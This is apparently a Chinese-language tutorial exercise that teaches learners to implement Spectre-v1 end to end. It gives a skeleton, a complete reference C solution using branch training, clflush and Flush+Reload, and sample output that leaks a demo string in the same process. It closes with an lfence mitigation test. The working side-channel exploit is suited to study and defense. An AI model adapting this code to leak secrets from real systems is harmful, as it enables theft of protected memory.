# 練習 B — Spectre-v1 端到端洩漏

> **目標**：完整實作 Spectre-v1，跨越一個真實的 bounds check，從「不該讀的」記憶體洩漏一段 secret 字串。你要自己動手寫每一行——訓練節奏、probe array 的索引算法、Flush+Reload readout——而不是把別人的 PoC 跑一遍。完成後你要能回答：gadget 成立需要哪些條件？為什麼 `* CACHE_LINE`？訓練 5 次攻擊 1 次的比例從哪來？

## 任務規格

實作一支 C 程式 `spectre_v1_demo.c`，做到以下事情：

1. **佈置記憶體**：`array1[0..15]`（victim 的合法讀取範圍）與 `secret[]`（victim 不該讀的字串）放在同一塊連續記憶體，且 secret 位於 array1 之後某個偏移。
2. **實作 victim function**：帶一個 bounds check（`if (x < array1_size)`），正常路徑只讀 array1；推測路徑讀越界位置。
3. **攻擊迴圈**：對每一個 secret byte，跑「訓練 × 5 + 攻擊 × 1」的節奏，用 `clflush(array1_size)` 延長推測視窗，用位元遮罩（mask trick）選 x 而非明顯的 if-else。
4. **F+R readout**：對 `array2[0..255]` 的每條 line 計時，亂序探測（`(i * 167 + 13) & 0xFF`），找出 hit 次數最高的 index → 那就是洩漏的 byte 值。
5. **輸出**：每個 byte 印出推測值、實際值、信心分數（最高票 − 次高票），最後印出完整還原字串與正確率。

## 你必須理解才能動手的概念

在開始打 code 之前，先確認你對以下問題有明確答案（不是「大概知道」）：

**Q1：gadget 成立需要哪三個條件？**

```
條件 1：______________________________________________
條件 2：______________________________________________
條件 3：______________________________________________
```

**Q2：為什麼 probe array 的索引是 `secret_byte * 512`（或 * CACHE_LINE）而不是直接 `secret_byte`？**

```
答案：_________________________________________________
```

**Q3：為什麼要先 `clflush(&array1_size)` 再呼叫 victim_function？**

```
答案：_________________________________________________
```

**Q4：訓練 5 次、攻擊 1 次——如果比例改成 1:1，攻擊為什麼會失效？**

```
答案：_________________________________________________
```

如果這四題有任何一題答不出來，先把 Ch 13–15 翻回去讀。動手之前答案要清楚，不然你 debug 到死也找不到原因。

## 程式骨架

先把骨架打出來，再逐步填空：

```c
/* spectre_v1_demo.c
 * 編譯：gcc -O0 spectre_v1_demo.c -o spectre_v1_demo
 * 執行：taskset -c 2 ./spectre_v1_demo
 */
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <x86intrin.h>

/* ---- 參數 ---- */
#define PROBE_SIZE  256    /* array2 的條目數（一個 byte 有 256 種值） */
#define CACHE_LINE  512    /* 每個條目的間距（bytes）                */
#define THRESHOLD   150    /* hit/miss 門檻（Ch 0 校準結果）         */

/* ---- 全域記憶體佈局 ---- */
/* 把 array1 與 secret 放在同一個 big_buf，確保 secret 在後面 */
uint8_t big_buf[4096];
size_t  array1_size = 16;  /* 放全域才能 clflush */
uint8_t array2[PROBE_SIZE * CACHE_LINE];  /* probe array */
uint8_t temp = 0;          /* 防 dead-store 優化 */

/* ---- victim function ---- */
/* TODO：實作 bounds check + 推測路徑 */
void victim_function(size_t x) {
    /* 填空 */
}

/* ---- 計時函式 ---- */
static inline uint64_t timed_access(volatile uint8_t *addr) {
    /* 填空：用 rdtscp 前後夾住一次存取 */
}

/* ---- 核心攻擊：讀一個 byte ---- */
void readByte(size_t malicious_x, uint8_t *out_val, int *out_score) {
    int hits[256] = {0};
    /* TODO：
     * 外層迴圈 1000 次 tries：
     *   1. clflush array2 的每條 line
     *   2. 訓練 + 攻擊（30 輪，每 6 輪一次攻擊）
     *      - clflush(&array1_size) + 等待
     *      - mask trick 選 x
     *      - 呼叫 victim_function(x)
     *   3. F+R 亂序探測 256 條 line，hits[byte]++
     * 找 best 與 second，輸出 *out_val 和 *out_score
     */
}

int main(void) {
    /* TODO：
     * 初始化 big_buf[0..15]（array1 值）、big_buf[256..]（secret）
     * malicious_x = 256（secret 在 big_buf 的起始 index）
     * 印出位址資訊
     * 逐 byte 呼叫 readByte，印出結果
     * 印出還原字串與正確率
     */
}
```

## 實作步驟建議

### Step 1：記憶體佈局（先把位址關係搞清楚）

```
big_buf: [0..15 = array1] [16..255 = 隔離區] [256..= secret]
```

為什麼要把 secret 放在 array1 **之後**？因為 malicious_x = offset 必須是正數（`size_t` 是無符號，負偏移會繞到超大數字，bounds check 幾乎不可能被推測通過）。

初始化：
- `big_buf[i] = i + 1` for i in 0..15（給 training 用的合法值）
- `memcpy(&big_buf[256], secret_msg, len)` 把字串放進去
- `for (i=0; i<256; i++) array2[i * CACHE_LINE] = 1` 確保頁面分配

### Step 2：victim_function

```c
void victim_function(size_t x) {
    if (x < array1_size) {         // bounds check（會被推測跳過）
        temp &= array2[big_buf[x] * CACHE_LINE];  // 推測路徑讀 big_buf[x]
    }
}
```

這個 gadget 的三個成立條件全部在這幾行裡：
- `x < array1_size`：checks check（CPU 要猜它的結果）
- `big_buf[x]`：被洩漏的值用來做第二次記憶體索引
- `array2[... * CACHE_LINE]`：把值編碼進快取狀態

### Step 3：clflush array1_size

```c
_mm_clflush(&array1_size);
for (volatile int z = 0; z < 100; z++) {}  // 等 clflush 清管線
```

關鍵：`array1_size` 必須是**全域變數**才能被 clflush（不能是 `#define`，因為常數沒有位址）。

踢掉 array1_size 讓 bounds check 在等待記憶體讀取的那段時間裡繼續推測執行——那就是推測視窗。

### Step 4：mask trick（無分支 x 選擇）

目標：j % 6 == 0 時用 malicious_x，其他時候用 training_x，但不要讓預測器學到「第幾輪是攻擊」：

```c
int   is_attack = ((j % 6) == 0);        // 1 或 0
size_t mask     = (size_t)(-(int64_t)is_attack);
// is_attack == 1 → mask = 0xFFFFFFFFFFFFFFFF（全 1）
// is_attack == 0 → mask = 0x0000000000000000（全 0）
size_t x = (malicious_x & mask) | (training_x & ~mask);
// is_attack → x = malicious_x
// 否則      → x = training_x
```

為什麼不直接寫 `x = is_attack ? malicious_x : training_x`？因為那個三元運算子會被編譯成有分支的 cmov 或 branch，分支預測器本身可能學到「每 6 輪攻擊一次」，干擾 victim_function 的預測訓練效果。

### Step 5：Flush+Reload readout（亂序探測）

```c
for (i = 0; i < 256; i++) {
    int mi = ((i * 167) + 13) & 0xFF;   // 亂序索引
    volatile uint8_t *addr = &array2[mi * CACHE_LINE];
    uint64_t t = timed_access(addr);
    if ((int)t < THRESHOLD) hits[mi]++;
}
```

亂序的原因：如果按順序 0、1、2、3... 探測，prefetcher 會看出等差樣式，提前把後面的 line 抓進快取，把 miss 變成 false hit。用質數 167 生成的排列打散循序性。

## 踩雷（你一定會踩，先預告）

1. **`#define ARRAY1_SIZE 16` 沒有位址，clflush 時編譯錯誤**：改成 `size_t array1_size = 16;` 全域變數。

2. **secret 位址在 array1 之前，malicious_x 是超大數**：這台機器 BSS 的排列順序不可預期。不要假設「後宣告就在後面」，要明確用 big_buf 把相對位置固定。

3. **array2 沒有 touch，COW 頁面未分配，F+R 全 miss**：`for (int i=0; i<256; i++) array2[i*CACHE_LINE] = 1;` 在攻擊前跑一遍。

4. **probe 的第一個 byte（index 0）票數異常高**：index 0 是 null byte 的代表，`hits[0]` 容易被 noise 污染。找 best 時排除 index 0，或至少在輸出裡特別注意。

5. **訓練輪數不夠，信心低到接近 0**：原始 Kocher et al. PoC 用 1000 tries × 30 rounds，不是 10 tries 就能出結果。WSL2 雜訊比裸機大，tries 可能要調到 1500-2000 才穩。

6. **`-O2` 編譯會把 `temp &= array2[...]` 優化掉**：一定要 `-O0`。victim_function 的推測路徑需要真的對記憶體做存取，不能被 DCE 優化掉。

## 驗證你的實作

攻擊結果應該要達到：

```
byte[ 0]  推測='S'  實際='S'  信心=高（> 200）  [Y]
byte[ 1]  推測='P'  實際='P'  信心=高           [Y]
...
還原字串: "SPECTRE_LEAKS_THIS"
正確率: 18 / 18 (100%)
```

如果信心一直很低（< 50）但字元偶爾對：試試把 tries 從 1000 加到 2000。

如果 hits 全集中在 index 0 或 1：array1 的值初始化有問題，array1[0] = 0 的話推測讀到的值就是 0，對應 hits[0]。

如果字元全錯、hits 亂分佈：clflush(array1_size) 沒生效，或 mask trick 算法有誤，或 array2 位址未正確計算。

---

<details>
<summary><strong>參考解答（含真實執行輸出）——先自己做完再展開</strong></summary>

### 完整程式碼

```c
/*
 * spectre_v1_demo.c — Spectre-v1 端到端洩漏示範（參考解答）
 * 編譯：gcc -O0 spectre_v1_demo.c -o spectre_v1_demo
 * 執行：taskset -c 2 ./spectre_v1_demo
 *
 * 測試環境：Intel Core i7-10700, WSL2 Ubuntu 22.04
 * 真實跑出：18/18 bytes 正確，信心分數 562–900
 */
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <x86intrin.h>

/* ---- 常數 ---- */
#define PROBE_SIZE  256   /* array2 條目數：一個 byte 有 256 種值                 */
#define CACHE_LINE  512   /* 每條目間距 512 bytes，確保不同值對應不同 cache set   */
#define THRESHOLD   150   /* hit/miss 門檻（Ch 0 校準：HIT~24 / MISS~244 cycles） */

/*
 * ---- 記憶體佈局 ----
 *
 * big_buf:
 *   [  0.. 15]  array1（victim 合法讀取範圍，值 1-16）
 *   [ 16..255]  隔離填充
 *   [256..    ]  secret（攻擊目標，victim 不該讀到）
 *
 * 讓 secret 在 array1 之後（正偏移），malicious_x = 256
 */
uint8_t big_buf[4096];
size_t  array1_size = 16;              /* 全域變數：才能用 _mm_clflush 踢出快取 */
uint8_t array2[PROBE_SIZE * CACHE_LINE];
uint8_t temp = 0;                      /* 防 dead-store 優化用 */

/*
 * victim_function(x)
 * 正常路徑：x < 16，讀 big_buf[x]（值 1-16），存取 array2 對應 line
 * 推測路徑：CPU 在確認 x < array1_size 之前猜 bounds check 會過，
 *           推測執行 array2[big_buf[x] * CACHE_LINE]
 *           此時 x = 256+ → big_buf[x] = secret[i] → 把對應 line 帶入快取
 */
void victim_function(size_t x) {
    if (x < array1_size) {
        temp &= array2[big_buf[x] * CACHE_LINE];
    }
}

/* rdtscp 序列化計時一次記憶體存取 */
static inline uint64_t timed_access(volatile uint8_t *addr) {
    unsigned junk;
    uint64_t t0 = __rdtscp(&junk);
    (void)*addr;
    uint64_t t1 = __rdtscp(&junk);
    return t1 - t0;
}

/*
 * readByte(malicious_x, &value, &score)
 *
 * 透過 Spectre-v1 讀出 big_buf[malicious_x]（= secret 的某個 byte）
 * 每個 byte 跑 1000 次投票，取 hit 次數最高的 array2 index 作為答案
 */
void readByte(size_t malicious_x, uint8_t *out_val, int *out_score) {
    int hits[256] = {0};
    int i, j, tries;

    for (tries = 0; tries < 1000; tries++) {

        /* Step 1: 把 array2 全 256 條 line 踢出快取（F+R 的 Flush 步驟） */
        for (i = 0; i < PROBE_SIZE; i++)
            _mm_clflush(&array2[i * CACHE_LINE]);

        /* Step 2: 訓練 + 攻擊（30 輪，每 6 輪觸發一次攻擊） */
        size_t training_x = tries % array1_size;   /* 合法索引 0-15，循環 */

        for (j = 29; j >= 0; j--) {
            /*
             * 踢掉 array1_size：
             * victim_function 裡的 `x < array1_size` 要讀記憶體才能確認結果，
             * 讀記憶體需要 ~244 cycles（DRAM miss），
             * 這段時間 CPU 繼續推測執行——那就是推測視窗。
             */
            _mm_clflush(&array1_size);
            for (volatile int z = 0; z < 100; z++) {}   /* 等 clflush 清管線 */

            /*
             * Mask trick：無分支選擇 x
             * j % 6 == 0 → is_attack = 1 → mask = 0xFFFF...FFFF → x = malicious_x
             * j % 6 != 0 → is_attack = 0 → mask = 0x0000...0000 → x = training_x
             *
             * 不用三元運算子（?: 可能被編譯成 branch），
             * 避免 CPU 學到「每 6 輪有一次攻擊」並調整自己的推測行為。
             */
            int    is_attack = ((j % 6) == 0);
            size_t mask = (size_t)(-(int64_t)is_attack);
            size_t x    = (malicious_x & mask) | (training_x & ~mask);

            victim_function(x);
        }

        /* Step 3: Flush+Reload 探測——亂序走 256 條 line */
        for (i = 0; i < PROBE_SIZE; i++) {
            /*
             * 亂序排列（用質數 167 打散）：
             * 如果按順序 0、1、2... 探測，prefetcher 看出等差樣式，
             * 把後面的 miss 提前抓成 hit，造成假陽性。
             * ((i * 167) + 13) & 0xFF 是 0-255 的一個排列（gcd(167,256)=1）。
             */
            int mi = ((i * 167) + 13) & 0xFF;
            volatile uint8_t *addr = &array2[mi * CACHE_LINE];
            uint64_t t = timed_access(addr);
            if ((int)t < THRESHOLD)
                hits[mi]++;
        }
    }

    /* Step 4: 找票數最高（best）與次高（second）的 index */
    int best = 0, second = -1;
    for (i = 1; i < 256; i++) {
        if (hits[i] > hits[best])        { second = best; best = i; }
        else if (second < 0 || hits[i] > hits[second]) second = i;
    }

    *out_val   = (uint8_t)best;
    *out_score = hits[best] - (second >= 0 ? hits[second] : 0);
}

int main(void) {
    int i;
    const char *msg = "SPECTRE_LEAKS_THIS";
    int msglen = (int)strlen(msg);
    int secret_offset = 256;   /* secret 放在 big_buf[256] 開始 */

    /* 初始化 array1（big_buf 前 16 個 byte）*/
    for (i = 0; i < 16; i++) big_buf[i] = (uint8_t)(i + 1);
    /* 把 secret 放進 big_buf[256..] */
    memcpy(&big_buf[secret_offset], msg, msglen + 1);
    /* 確保 array2 的每個頁面都已分配（avoid COW + page fault noise） */
    for (i = 0; i < PROBE_SIZE; i++) array2[i * CACHE_LINE] = 1;

    /* malicious_x：讓 victim_function(malicious_x + i) 讀到 secret[i] */
    size_t malicious_x = (size_t)secret_offset;

    printf("=== Spectre v1 端到端洩漏示範 ===\n");
    printf("big_buf (array1 base) @ %p\n", (void *)big_buf);
    printf("secret @ big_buf[%d]  = %p\n", secret_offset, (void *)&big_buf[secret_offset]);
    printf("malicious_x = %zu  (越界 index，victim 正常 bound = %zu)\n",
           malicious_x, array1_size);
    printf("secret (ground truth): [%s]\n", &big_buf[secret_offset]);
    printf("THRESHOLD = %d cycles  (HIT~24 / MISS~244, Ch 0 校準)\n\n", THRESHOLD);

    printf("逐 byte 洩漏（每 byte 投票 1000 次）:\n");
    uint8_t recovered[64] = {0};

    for (i = 0; i < msglen; i++) {
        uint8_t val; int score;
        readByte(malicious_x + i, &val, &score);
        recovered[i] = val;
        printf("  byte[%2d]  推測=0x%02X '%c'  實際=0x%02X '%c'  信心=%3d  [%c]\n",
               i,
               val,  (val  >= 32 && val  < 127) ? (char)val  : '.',
               (uint8_t)msg[i], (msg[i] >= 32 && msg[i] < 127) ? msg[i] : '.',
               score,
               (val == (uint8_t)msg[i]) ? 'Y' : 'N');
    }

    printf("\n還原字串: \"");
    for (i = 0; i < msglen; i++)
        putchar((recovered[i] >= 32 && recovered[i] < 127) ? (char)recovered[i] : '?');
    printf("\"\n");

    int correct = 0;
    for (i = 0; i < msglen; i++) correct += (recovered[i] == (uint8_t)msg[i]);
    printf("正確率: %d / %d (%.0f%%)\n", correct, msglen, 100.0 * correct / msglen);
    return 0;
}
```

### 真實執行輸出

```
測試環境：Intel Core i7-10700 (Comet Lake), WSL2 Ubuntu 22.04 (kernel 6.18.33.2-microsoft)
編譯：gcc -O0 spectre_v1_demo.c -o spectre_v1_demo
執行：taskset -c 2 ./spectre_v1_demo

=== Spectre v1 端到端洩漏示範 ===
big_buf (array1 base) @ 0x5800b5595060
secret @ big_buf[256]  = 0x5800b5595160
malicious_x = 256  (越界 index，victim 正常 bound = 16)
secret (ground truth): [SPECTRE_LEAKS_THIS]
THRESHOLD = 150 cycles  (HIT~24 / MISS~244, Ch 0 校準)

逐 byte 洩漏（每 byte 投票 1000 次）:
  byte[ 0]  推測=0x53 'S'  實際=0x53 'S'  信心=656  [Y]
  byte[ 1]  推測=0x50 'P'  實際=0x50 'P'  信心=896  [Y]
  byte[ 2]  推測=0x45 'E'  實際=0x45 'E'  信心=889  [Y]
  byte[ 3]  推測=0x43 'C'  實際=0x43 'C'  信心=887  [Y]
  byte[ 4]  推測=0x54 'T'  實際=0x54 'T'  信心=883  [Y]
  byte[ 5]  推測=0x52 'R'  實際=0x52 'R'  信心=882  [Y]
  byte[ 6]  推測=0x45 'E'  實際=0x45 'E'  信心=890  [Y]
  byte[ 7]  推測=0x5F '_'  實際=0x5F '_'  信心=893  [Y]
  byte[ 8]  推測=0x4C 'L'  實際=0x4C 'L'  信心=885  [Y]
  byte[ 9]  推測=0x45 'E'  實際=0x45 'E'  信心=871  [Y]
  byte[10]  推測=0x41 'A'  實際=0x41 'A'  信心=881  [Y]
  byte[11]  推測=0x4B 'K'  實際=0x4B 'K'  信心=780  [Y]
  byte[12]  推測=0x53 'S'  實際=0x53 'S'  信心=691  [Y]
  byte[13]  推測=0x5F '_'  實際=0x5F '_'  信心=891  [Y]
  byte[14]  推測=0x54 'T'  實際=0x54 'T'  信心=883  [Y]
  byte[15]  推測=0x48 'H'  實際=0x48 'H'  信心=900  [Y]
  byte[16]  推測=0x49 'I'  實際=0x49 'I'  信心=897  [Y]
  byte[17]  推測=0x53 'S'  實際=0x53 'S'  信心=562  [Y]

還原字串: "SPECTRE_LEAKS_THIS"
正確率: 18 / 18 (100%)
```

**解讀**：
- 18 個 byte 全部正確，信心分數在 562–900 之間（最高 900 表示那個值在 1000 次裡有 900 次 hit，而次高票只有幾十次）。
- 信心偏低的（byte[0] = 656）通常是 S 與前一輪殘留的值有一點重疊，但仍然遠高於次高票。
- 這是在 WSL2（有 VM 雜訊）上跑出來的結果——裸機 Linux 信心分數會更穩、更集中。

### 解析每個設計決策

**為什麼 `* CACHE_LINE`（為什麼是 512）？**

array2 要把 256 個可能的 byte 值映射到**不同的 cache set**。如果只是 `array2[secret_byte]`，256 個 byte 緊密排在一起，分享同一批 cache set，你踢掉一條 line 可能同時踢掉相鄰的 line，造成假陽性。

Cache line 大小是 64 bytes。想讓每個 index 對應一條獨立的 cache line，最小間距就是 64 bytes。但 64 可能剛好讓一些 index 落在同一個 cache set（因為 set index 通常從位址的 bit 6 起算）。用 512 bytes（= 64 × 8）能確保跨越更多 cache set，讓每個 byte 值有更獨立的位址空間。

原始 Kocher et al. 論文用 `* 512`，就是這個原因。

**訓練節奏：為什麼 5:1？**

分支預測器的歷史表（PHT, Pattern History Table）通常是 2-bit 飽和計數器，需要連續看到某個結果才會改變預測。5 次合法訓練讓預測器的計數器牢牢偏向「x < array1_size = true」；第 6 次攻擊雖然實際上 x >= array1_size，但預測器來不及改口，仍然推測「bounds check 會過」，推測執行就這樣發生了。

比例越高（例如 9:1），推測視窗越穩定，但攻擊機會越少；比例越低（例如 1:1），訓練不夠充分，預測器猶豫，推測視窗變短甚至不開。5:1 是 Kocher et al. 發現的實用平衡點。

**clflush(array1_size) 的作用機制**

```
沒有 clflush：
  array1_size 在 L1     → bounds check 在 ~4 cycles 內確認 → 推測視窗幾乎不存在
                                                               推測路徑來不及完成
有 clflush：
  array1_size 在 DRAM   → bounds check 要等 ~244 cycles 才確認 → 推測視窗 244 cycles
                                                                   足夠讓 array2 存取完成
```

這個時間差是 Spectre-v1 能運作的物理根源。沒有這個 delay，推測視窗太窄，gadget 做的事來不及留下快取痕跡就被 squash 掉了。

### gadget 成立的三個條件（參考答案）

**條件 1：存在可訓練的條件分支**
victim_function 裡的 `if (x < array1_size)` 必須是 CPU 能訓練預測結果的分支。如果是 runtime 才決定的複雜條件、或者分支從未被訓練過，推測執行就不會往那個方向跑。

**條件 2：推測路徑的存取把秘密編碼進快取狀態**
`array2[big_buf[x] * CACHE_LINE]` 這行必須真實發生記憶體存取（不能被 dead-store 優化掉），且 `big_buf[x]` 的值要能影響哪條 line 進快取。這就是為什麼 `-O0` 不可少，以及 `temp &= ...` 要讓結果有 use。

**條件 3：攻擊者能用計時通道觀察快取狀態**
攻擊者（同一 process）要能存取 array2，並用 Flush+Reload 讀出哪條 line 在快取裡。跨 process 或跨 privilege 的 Spectre 需要共享記憶體或其他通道，這個 same-process 示範是最乾淨的形式。

</details>

---

## 延伸挑戰

1. **改變 secret 字串**：把 `"SPECTRE_LEAKS_THIS"` 換成包含特殊字元、數字、大小寫混合的字串，驗證攻擊對任意 byte 值都有效（包括 0x00、0xFF、0x01）。

2. **測量 spectre window 大小**：在 victim_function 的 bounds-check 和 array2 存取之間插入不同數量的 nop（或 delay loop），找出「推測視窗剛好夠 gadget 完成」的最小 delay 是多少 cycles。這就是 spectre window。

3. **繞開緩解**：在你的程式裡的 victim_function 加入 `asm volatile("lfence" ::: "memory");` 在 bounds check 之後、array2 存取之前，重跑攻擊——確認 lfence 確實把信心分數打趴。這就是 retpoline/lfence 緩解機制的實際效果。

4. **信心分布分析**：把 hits[256] 的完整分布印出來（不只是 best 和 second），觀察：是只有一個 spike，還是雜訊底部也有幾十個 hits？這個分布的形狀告訴你什麼關於 F+R 的訊號品質？

## 連結到 Rowhammer

Spectre-v1 是**推測執行**把秘密洩漏到快取側信道。從下一章開始，我們跳出「讀秘密」的框架，轉向一個完全不同的問題：**能不能用存取樣式去擾動 DRAM 的物理狀態**——不是讀錯誤的記憶體，而是讓正確位置的 bit 翻轉。Rowhammer 做的是主動破壞，而不是被動觀察。

機制完全不同，但同一把尺（計時）還在，同樣的前提（你需要控制記憶體存取樣式）還在。

→ [Ch 22 Rowhammer 基礎](./22-rowhammer-basics.md)
